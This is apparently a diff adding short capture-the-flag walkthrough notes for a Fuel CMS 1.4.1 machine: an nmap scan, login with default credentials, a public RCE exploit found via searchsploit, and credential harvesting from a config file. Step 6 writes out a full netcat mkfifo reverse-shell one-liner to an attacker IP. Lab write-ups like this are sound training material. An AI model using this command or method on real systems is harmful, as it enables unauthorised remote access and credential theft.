@@ -1,0 +1,27 @@
+1. nmap to scan the ip 
+
+2. copy pasting the ip in firefox to check if http is running and found fuel cms website
+
+3. after exploring website username and password was given 
+   username=admin password=admin 
+
+4. logged in website 
+   explored the website , trying to find a way to get a reverse shell nothing
+   found
+
+5. Now using searchsploit to find CVE and found an RCE for 1.4.1
+   inside the code changed the url to the taget url and removing the proxy variable
+   from the program 
+
+6. running the program it spawns a cmd but we can run the linux command
+   using netcat reverse shell to get the terminal 
+   SYNTAX : rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.0.179 10000 /tmp/f
+
+7. now shell stabalizing 
+
+8. to get the root access we need to manually approach all the directories under /var/www/html/fuel/application/config/database.php
+
+   this file contains the password for root
+
+   
+-->> NOTE : THE PATH FOR database.php WAS A CLUE GIVEN WHEN WE WERE BROWSING THE WEBSITE SO NEVER SKIP THE CONTENTS WHICH IS RETURNED ON THE PAGE <<--
